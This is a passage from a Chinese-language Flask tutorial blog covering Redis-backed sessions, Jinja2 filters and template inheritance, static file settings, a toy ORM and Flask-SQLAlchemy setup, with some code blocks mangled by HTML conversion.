class=\"built_in\">locals</span>())</span><br></pre></td></tr></table></figure>\n\n<p>locals()将当前函数内部的变量生成字典对象，变量名即是字典的key，变量值即是key对应的value。</p>\n<h1 id=\"WEB服务Flask第三天\"><a href=\"#WEB服务Flask第三天\" class=\"headerlink\" title=\"WEB服务Flask第三天\"></a>WEB服务Flask第三天</h1><h2 id=\"一、Flask-Session插件\"><a href=\"#一、Flask-Session插件\" class=\"headerlink\" title=\"一、Flask-Session插件\"></a>一、Flask-Session插件</h2><p>补充说明：session解决每个客户端中将数据共享在多个请求中，即为每个客户端（client）都会创建session会话连接。问题是服务端如何判断session属于哪一个客户端的。在HTTP协议中已经考虑此问题，解决方案是在cookie中存储一个session_id，当请求发送给服务器时，cookie信息也会传给服务器，服务器以此session_id确定当前请求是属于哪一个session会话的。</p>\n<p><strong>在flask中默认情况下，session的数据存在cookie中（客户端）</strong>。通过flask-session插件，解决将session的数据存储在数据库中或缓存（Redis）中。</p>\n<p>首先安装flask-session插件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">pip install flask-session</span><br><span class=\"line\">pip install redis==<span class=\"number\">2.10</span><span class=\"number\">.6</span> -i https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure>\n\n<p>配置flask的session信息，在settings.py脚本中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> redis <span class=\"keyword\">import</span> Redis</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Dev</span>():</span><br><span class=\"line\">    ENV = <span class=\"string\">&#x27;developement&#x27;</span> <span class=\"comment\"># 默认运行环境production</span></span><br><span class=\"line\">    SECRET_KEY = <span class=\"string\">&#x27;!zaq&amp;wsx$&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 配置session</span></span><br><span class=\"line\">    SESSION_TYPE = <span class=\"string\">&#x27;redis&#x27;</span></span><br><span class=\"line\">    SESSION_REDIS = Redis(host=<span class=\"string\">&#x27;192.168.200.4&#x27;</span>, db=<span class=\"number\">8</span>)</span><br></pre></td></tr></table></figure>\n\n<p>在创建flask的脚本中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_session <span class=\"keyword\">import</span> Session</span><br><span class=\"line\"><span class=\"keyword\">import</span> settings</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"><span class=\"comment\"># 从指定的对象中加载flask服务的配置</span></span><br><span class=\"line\">app.config.from_object(settings.Dev())</span><br><span class=\"line\"></span><br><span class=\"line\">session = Session()</span><br><span class=\"line\">session.init_app(app) <span class=\"comment\"># 初始化session插件</span></span><br></pre></td></tr></table></figure>\n\n<p>session的使用跟之前用法相同，即从flask库中导入session对象即可。</p>\n<h2 id=\"二、模板技术与静态资源\"><a href=\"#二、模板技术与静态资源\" class=\"headerlink\" title=\"二、模板技术与静态资源\"></a>二、模板技术与静态资源</h2><h3 id=\"2-1template模板\"><a href=\"#2-1template模板\" class=\"headerlink\" title=\"2.1template模板\"></a>2.1template模板</h3><p>Flask使用了Jinja2模板技术，支持变量、循环与分支以及自定义标签，支持点“.”语法，如：</p>\n<p>1、对象.属性</p>\n<p>2、列表.索引下标</p>\n<p>3、字典.key</p>\n<p>模板的html文件存放在templates目录中，templates目录下的所有html网页文件，内部都可以使用jinja2模板的语法，但是html文件必须在view视图函数中通过render_template(‘xx.html’)渲染，即渲染模板文件就是解析模板语法。</p>\n<h4 id=\"2-1-1-模板过滤器\"><a href=\"#2-1-1-模板过滤器\" class=\"headerlink\" title=\"2.1.1 模板过滤器\"></a>2.1.1 模板过滤器</h4><p>过滤器主要针对模板中变量的数据进行处理，如日期的格式化、字符串格式化、大小写转换以及列表元素的提取等处理。</p>\n<p>参考源码：jinja2.filters.py文件</p>\n<h5 id=\"2-1-1-1-常用的过滤器\"><a href=\"#2-1-1-1-常用的过滤器\" class=\"headerlink\" title=\"2.1.1.1 常用的过滤器\"></a>2.1.1.1 常用的过滤器</h5><p>1.字符串过滤器</p>\n<p>（1）capitalize 首字母大写；（2）title 每个单词的首字母大写；（3）upper 大写转换；（4）lower 小写转换；（5）format 格式化字符串，类似于%s格式化；（6）trim 删除两边的空格，类似于字符串的strip()函数；（7）default 指定默认值</p>\n<p>2.列表（可迭代）过滤器</p>\n<p>（1）unique 去掉重复的元素；（2）join 使用指定字符，连接可迭代对象中每一个元素；（3）last 读取最后一个元素；（4）first 读取第一个元素；（5）slice 切分指定元素个数的多个子列表；（6）random随机读取列表中的某一个元素；</p>\n<p>（7）sort 排序；（8）list 将生成器、可迭代对象转成list。</p>\n<p>3.安全性过滤器</p>\n<p>（1）striptags 删除字符串所有html标签（开始、结束）；（2）safe 渲染字符串的html标签，不会进行escape转换；（3）make_safe；（5）make_unsafe。</p>\n<p>4.数值过滤器</p>\n<p>（1）int 转成int；（2）float 转成float类型；（filesizeformat 按文件大小的格式转换）；（3）round 四舍五入，precision=0, method=”common|ceil|floor”；</p>\n<h5 id=\"2-1-1-2-自定义过滤器\"><a href=\"#2-1-1-2-自定义过滤器\" class=\"headerlink\" title=\"2.1.1.2 自定义过滤器\"></a>2.1.1.2 自定义过滤器</h5><p>如果提供的过滤器不满足现有的需求，可以自定义过滤器</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 自定义模板过滤器</span></span><br><span class=\"line\"><span class=\"meta\">@app.template_filter(<span class=\"params\"><span class=\"string\">&#x27;datefmt&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">datefmt_filter</span>(<span class=\"params\">value, *args</span>):</span><br><span class=\"line\">    <span class=\"comment\"># value是datatime类型</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(value, <span class=\"built_in\">type</span>(value), args)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> value.strftime(args[<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<p>自定义过滤器，实现货币格式化</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.template_filter(<span class=\"params\"><span class=\"string\">&#x27;moneyfmt&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">moneyfmt_filter</span>(<span class=\"params\">value, method=<span class=\"string\">&quot;common&quot;</span>, precision=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    <span class=\"comment\"># method == &#x27;common&#x27; 普通的金额的格式化，以千位符分隔</span></span><br><span class=\"line\">    value = <span class=\"built_in\">round</span>(value, precision)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> method == <span class=\"string\">&#x27;common&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(value, <span class=\"built_in\">int</span>):</span><br><span class=\"line\">            pre_v = <span class=\"built_in\">str</span>(value)</span><br><span class=\"line\">            end_v = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            pre_v, end_v = <span class=\"built_in\">str</span>(value).split(<span class=\"string\">&#x27;.&#x27;</span>)</span><br><span class=\"line\">            end_v = <span class=\"string\">&quot;.&quot;</span> + end_v</span><br><span class=\"line\"></span><br><span class=\"line\">        pre_v = pre_v[::-<span class=\"number\">1</span>]</span><br><span class=\"line\">        vs = [pre_v[i*<span class=\"number\">3</span>:i*<span class=\"number\">3</span>+<span class=\"number\">3</span>] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(math.ceil(<span class=\"built_in\">len</span>(pre_v)/<span class=\"number\">3</span>))]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;,&#x27;</span>.join(vs)[::-<span class=\"number\">1</span>] + end_v</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># method == &#x27;currency&#x27; 货币单位，万，百万，千万，亿</span></span><br><span class=\"line\">    cur = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> value / <span class=\"number\">10000</span> &lt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        cur = <span class=\"string\">&#x27;元&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> value / (<span class=\"number\">100</span>*<span class=\"number\">10000</span>) &lt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        cur = <span class=\"string\">&#x27;万元&#x27;</span></span><br><span class=\"line\">        value = <span class=\"built_in\">round</span>(value / <span class=\"number\">10000</span>, <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> value / (<span class=\"number\">1000</span>*<span class=\"number\">10000</span>) &lt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        cur = <span class=\"string\">&#x27;百万元&#x27;</span></span><br><span class=\"line\">        value = <span class=\"built_in\">round</span>(value / (<span class=\"number\">100</span>*<span class=\"number\">10000</span>), <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> value / (<span class=\"number\">10000</span>*<span class=\"number\">10000</span>) &lt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        cur = <span class=\"string\">&#x27;千万元&#x27;</span></span><br><span class=\"line\">        value = <span class=\"built_in\">round</span>(value / (<span class=\"number\">1000</span>*<span class=\"number\">10000</span>), <span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        cur = <span class=\"string\">&#x27;亿元&#x27;</span></span><br><span class=\"line\">        value = <span class=\"built_in\">round</span>(value / (<span class=\"number\">10000</span>*<span class=\"number\">10000</span>), <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(value)+cur</span><br></pre></td></tr></table></figure>\n\n<p>上面的过滤器，定义了两个格式的金额表示，common是以千位符分隔的，currency是不同单位计算的。</p>\n<h4 id=\"2-1-2-布局模板标签\"><a href=\"#2-1-2-布局模板标签\" class=\"headerlink\" title=\"2.1.2 布局模板标签\"></a>2.1.2 布局模板标签</h4><p>又称之为结构标签，设计整体页面。如将页面分为上、左、右、下四部分。在子页面中可以继承布局的模板文件，有针对性的实现哪一部分，如只实现右边结构的内容。</p>\n<p>创建base.html模板文件，声明页面的结构。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>&#123;% block title %&#125; 主页 &#123;% endblock %&#125;<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">&#123;% block content %&#125;</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><figcaption><span>block title %&#125;  &#123;% endblock %&#125;``` 声明块区域，它的结构被定义title名称。</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">```&#123;% block content %&#125;  &#123;% endblock %&#125;``` 声明content内容显示的块区域。</span><br><span class=\"line\"></span><br><span class=\"line\">再创建index.html，此页面不需要像base.html那样，将html完整的标签写出来，只需要继承base.html，再使用```&#123;% block title %&#125;  &#123;% endblock %&#125; ```可以填充base.html页面的内容。</span><br><span class=\"line\"></span><br><span class=\"line\">```html</span><br><span class=\"line\">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% block title %&#125;</span><br><span class=\"line\">这是我的主页</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% block content %&#125;</span><br><span class=\"line\">    &lt;h3&gt;测试block结构标签&lt;/h3&gt;</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果index.html又被其他子页面继承，在子页面填充的内容会覆盖父一级填充块的内容。如果想保留父级填充块的内容，则在<code>&#123;% block %&#125;  &#123;% endblock %&#125; </code>两个标签之间增加<code>&#123;&#123; super() &#125;&#125;</code>.</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% extends &quot;index.html&quot; %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% block title %&#125;</span><br><span class=\"line\">    第三级的标题-主页</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;% block content %&#125;</span><br><span class=\"line\">    &#123;&#123; super() &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span>以后在此显示内容<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以使用<code>&#123;% include \"500.html\" %&#125;</code>标签将指定网页内容填充到当前位置。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% block content %&#125;</span><br><span class=\"line\">    &#123;&#123; super() &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h4</span>&gt;</span>以后在此显示内容<span class=\"tag\">&lt;/<span class=\"name\">h4</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;% include &quot;500.html&quot; %&#125;</span><br><span class=\"line\">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>include和extends的区别：</p>\n<ul>\n<li>include导入整个网页，但是不能进行修改</li>\n<li>extends只是继承网页，修改感兴趣的block</li>\n</ul>\n<h4 id=\"2-1-3-模板宏标签\"><a href=\"#2-1-3-模板宏标签\" class=\"headerlink\" title=\"2.1.3 模板宏标签\"></a>2.1.3 模板宏标签</h4><p>可以在html文件中使用<code>&#123;% macro 函数名() %&#125;</code>定义宏函数，它用于生成特定的html标签，而且在之后可以重复使用。</p>\n<p>在macro.html，内容如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% macro menu() %&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>用户管理<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>库存管理<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>角色管理<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在index.html中使用时，需要使用<code>&#123;% from %&#125;</code>标签将宏函数导入到当前的模板中</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% from &quot;404.html&quot; import menu %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123; menu() &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-1-4-模板分支循环标签\"><a href=\"#2-1-4-模板分支循环标签\" class=\"headerlink\" title=\"2.1.4 模板分支循环标签\"></a>2.1.4 模板分支循环标签</h4><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">            &#123;% for item in menus %&#125;</span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">li</span> &#123;% <span class=\"attr\">if</span> <span class=\"attr\">loop.index</span> % <span class=\"attr\">2</span> !=<span class=\"string\">0</span> %&#125;<span class=\"attr\">class</span>=<span class=\"string\">&quot;odd&quot;</span> &#123;% <span class=\"attr\">endif</span> %&#125; &gt;</span> &#123;&#123; item &#125;&#125; <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">            &#123;% endfor %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>loop循环信息：loop.first    loop.last    loop.index    loop.index0    loop.revindex    loop.revindex0</p>\n<h3 id=\"2-2-静态资源文件\"><a href=\"#2-2-静态资源文件\" class=\"headerlink\" title=\"2.2 静态资源文件\"></a>2.2 静态资源文件</h3><p>flask默认情况下指定在static目录中，访问路径也是/static，可以在创建flask对象时，指定static_folder和static_url_path两个参数。</p>\n<p>static_folder指定静态资源文件存放的目录，一般情况下，静态资源存放的是css、js、图片素材、字体等。</p>\n<p>static_url_path指定静态资源文件访问的url路径，默认是“/static”，如指定“/s”，针对static目录下的css下的my.css样式，完整访问路径url应该是：<a href=\"http://localhost:5000/s/css/my.css%E3%80%82\">http://localhost:5000/s/css/my.css。</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">app = Flask(__name__, static_folder=<span class=\"string\">&#x27;static&#x27;</span>, static_url_path=<span class=\"string\">&#x27;/s&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>也可以在settings.py文件文件配置, <font color=pink size=4>但不建议使用此方法。</font></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Dev</span>():</span><br><span class=\"line\">    ENV = <span class=\"string\">&#x27;developement&#x27;</span> <span class=\"comment\"># 默认运行环境production</span></span><br><span class=\"line\">    SECRET_KEY = <span class=\"string\">&#x27;!zaq&amp;wsx$&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 配置session</span></span><br><span class=\"line\">    SESSION_TYPE = <span class=\"string\">&#x27;redis&#x27;</span></span><br><span class=\"line\">    SESSION_REDIS = Redis(host=<span class=\"string\">&#x27;192.168.200.4&#x27;</span>, db=<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 配置静态资源目录及访问的URL</span></span><br><span class=\"line\">    STATIC_FOLDER = <span class=\"string\">&#x27;static&#x27;</span></span><br><span class=\"line\">    STATIC_URL_PATH = <span class=\"string\">&#x27;/s&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务-Flask第四天\"><a href=\"#WEB后端服务-Flask第四天\" class=\"headerlink\" title=\"WEB后端服务-Flask第四天\"></a>WEB后端服务-Flask第四天</h1><h2 id=\"一、数据库操作之ORM设计思想\"><a href=\"#一、数据库操作之ORM设计思想\" class=\"headerlink\" title=\"一、数据库操作之ORM设计思想\"></a>一、数据库操作之ORM设计思想</h2><p>相对于数据库的操作，设计DAO结构的目的是简化数据库的操作，把SQL语句封装到基础类（BaseDao）中，但是要求开发人员必须特别熟悉SQL语句和Python的基础。自己设计Dao的优点是有效防止SQL注入风险。通过使用ORM避免不会SQL的开发人员能够快速操作数据库，ORM的思想是将实体类（Model或Entries）和数据库表直接建立关联关系，即类-&gt;表，类对象-&gt;表中的记录，类对象的属性-&gt;表的字段。</p>\n<p>ORM(Object Relationship Mapping)对象关系映射。</p>\n<ul>\n<li><p>类和表</p>\n</li>\n<li><p>类实例即时表的记录</p>\n</li>\n<li><p>类属性即为表的字段</p>\n<p>当ORM关系映射成功之后，直接操作类和对象，即操作数据库中表或记录。</p>\n<p>简单地实现ORM(自省+元类)：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>():</span><br><span class=\"line\">\t<span class=\"built_in\">id</span> = <span class=\"number\">100</span></span><br><span class=\"line\">    name = <span class=\"number\">20</span></span><br><span class=\"line\">    money = <span class=\"number\">20000</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UserDB</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">save</span>(<span class=\"params\">user: User</span>):</span><br><span class=\"line\">        sql = <span class=\"string\">&quot;insert into user(id, name) values(%s, %s)&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> self.db <span class=\"keyword\">as</span> c:</span><br><span class=\"line\">            c.execute(sql, args=(user.<span class=\"built_in\">id</span>, user.name))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">User</span>():</span><br><span class=\"line\">      <span class=\"built_in\">id</span> = <span class=\"number\">1</span></span><br><span class=\"line\">      name = <span class=\"string\">&#x27;disen&#x27;</span></span><br><span class=\"line\">      money = <span class=\"number\">20000</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Order</span>():</span><br><span class=\"line\">      number = <span class=\"number\">1001</span></span><br><span class=\"line\">      title = <span class=\"string\">&#x27;huawei-10101&#x27;</span></span><br><span class=\"line\">      price = <span class=\"number\">19000</span></span><br><span class=\"line\">      city = <span class=\"string\">&#x27;xian&#x27;</span></span><br><span class=\"line\">      cate = <span class=\"string\">&#x27;手机神奇&#x27;</span></span><br><span class=\"line\">      store = <span class=\"string\">&#x27;神奇手机店&#x27;</span></span><br><span class=\"line\">      phone = <span class=\"string\">&#x27;11111111&#x27;</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">def</span> <span class=\"title function_\">save</span>(<span class=\"params\">entity</span>):</span><br><span class=\"line\">      <span class=\"built_in\">print</span>(<span class=\"built_in\">dir</span>(entity))</span><br><span class=\"line\">      <span class=\"comment\"># 读取对象的普通属性</span></span><br><span class=\"line\">      <span class=\"built_in\">print</span>([attr <span class=\"keyword\">for</span> attr <span class=\"keyword\">in</span> <span class=\"built_in\">dir</span>(entity) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> attr.startswith(<span class=\"string\">&#x27;__&#x27;</span>)])</span><br><span class=\"line\">      <span class=\"built_in\">print</span>(entity.__dict__)</span><br><span class=\"line\">      <span class=\"built_in\">print</span>(&#123;attr:<span class=\"built_in\">getattr</span>(entity, attr) <span class=\"keyword\">for</span> attr <span class=\"keyword\">in</span> <span class=\"built_in\">dir</span>(entity) <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> attr.startswith(<span class=\"string\">&#x27;__&#x27;</span>)&#125;)</span><br><span class=\"line\">  </span><br><span class=\"line\">      sql = <span class=\"string\">&quot;insert into %s(%s) values(%s)&quot;</span></span><br><span class=\"line\">      table = entity.__class__.__name__.lower()</span><br><span class=\"line\">      colnames = <span class=\"string\">&#x27;,&#x27;</span>.join([col <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> entity.__dict__])</span><br><span class=\"line\">      colplaceholders = <span class=\"string\">&#x27;,&#x27;</span>.join([<span class=\"string\">&quot;%%(%s)s&quot;</span> % col <span class=\"keyword\">for</span> col <span class=\"keyword\">in</span> entity.__dict__])</span><br><span class=\"line\">      sql = sql % (table, colnames, colplaceholders)</span><br><span class=\"line\">      <span class=\"built_in\">print</span>(sql)</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">      u1 = User()</span><br><span class=\"line\">      u1.<span class=\"built_in\">id</span> = <span class=\"number\">1000</span></span><br><span class=\"line\">      u1.name = <span class=\"string\">&#x27;jack&#x27;</span></span><br><span class=\"line\">      u1.money = <span class=\"number\">300000</span></span><br><span class=\"line\">  </span><br><span class=\"line\">      u2 = User()</span><br><span class=\"line\">      u2.<span class=\"built_in\">id</span> = <span class=\"number\">2000</span></span><br><span class=\"line\">      u2.name = <span class=\"string\">&#x27;xi&#x27;</span></span><br><span class=\"line\">      u2.money = <span class=\"number\">3000000</span></span><br><span class=\"line\">  </span><br><span class=\"line\">      save(u1)</span><br><span class=\"line\">      save(u2)</span><br><span class=\"line\">  </span><br><span class=\"line\">      o1 = Order()</span><br><span class=\"line\">      o1.number = <span class=\"number\">109919</span></span><br><span class=\"line\">      o1.phone = <span class=\"string\">&#x27;110&#x27;</span></span><br><span class=\"line\">      o1.title = Order.title</span><br><span class=\"line\">      o1.price = <span class=\"number\">19000</span></span><br><span class=\"line\">      o1.city = <span class=\"string\">&#x27;北京&#x27;</span></span><br><span class=\"line\">      save(o1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 二、Flask-SQLAlchemy插件</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 2.1 安装</span></span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\">pip install flask-sqlalchemy -i https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-2-配置\"><a href=\"#2-2-配置\" class=\"headerlink\" title=\"2.2 配置\"></a>2.2 配置</h3><p>在settings.Dev类进行配置</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 数据库连接的路径 dialect+driver://user:password@ip:port/db?charset=utf8</span></span><br><span class=\"line\">SQLALCHEMY_DATABASE_URI = <span class=\"string\">&#x27;mysql+pymysql://root:123456@192.168.200.4:3306/bank&#x27;</span></span><br><span class=\"line\">SQLALCHEMY_TRACK_MODIFICATIONS = <span class=\"literal\">True</span> <span class=\"comment\"># 可扩展</span></span><br><span class=\"line\">SQLALCHEMY_COMMIT_ON_TEARDOWN = <span class=\"literal\">True</span> <span class=\"comment\"># 回收资源时自动提交事务</span></span><br><span class=\"line\">SQLALCHEMY_ECHO =<span class=\"literal\">True</span> <span class=\"comment\"># 显示调试SQL</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-3-创建SQLAlchemy实例并初始化\"><a href=\"#2-3-创建SQLAlchemy实例并初始化\" class=\"headerlink\" title=\"2.3 创建SQLAlchemy实例并初始化\"></a>2.3 创建SQLAlchemy实例并初始化</h3><p>创建models模块，在它的“_<em>init</em>_.py”脚本中创建：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask_sqlalchemy <span class=\"keyword\">import</span> SQLAlchemy</span><br><span class=\"line\"></span><br><span class=\"line\">db = SQLAlchemy()</span><br></pre></td></tr></table></figure>\n\n<p>在创建Flask对象app的脚本中，初始化SQLAlchemy类对象。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> models <span class=\"keyword\">import</span> db</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"comment\"># 初始化sqlalchemy类对象</span></span><br><span class=\"line\">db.init_app(app)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-4-实战项目\"><a href=\"#2-4-实战项目\" class=\"headerlink\" title=\"2.4 实战项目\"></a>2.4 实战项目</h3><ol>\n<li><p>将银行系统下的所有表创建相应的模型类</p>\n<p>1.1. 声明用户的模型类UserEntity，继承db.Model父类</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 默认情况下：类名即为表名</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">User</span>(db.Model):</span><br><span class=\"line\">\t<span class=\"comment\"># 声明字段（属性），默认情况下属性名与字段相同</span></span><br><span class=\"line\">    <span class=\"built_in\">id</span> = db.Column(db.Integer, primary_key=<span class=\"literal\">True</span>, autoincrement=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    number = db.Column(db.String(<span class=\"number\">18</span>), unique=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    name = db.Column(db.String(<span class=\"number\">20</span>), nullable=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    phone = db.Column(db.String(<span class=\"number\">20</span>))</span><br><span class=\"line\">    password = db.Column(db.String(<span class=\"number\">100</span>), nullable=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n\n<p>1.2. 声明银行模型</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span 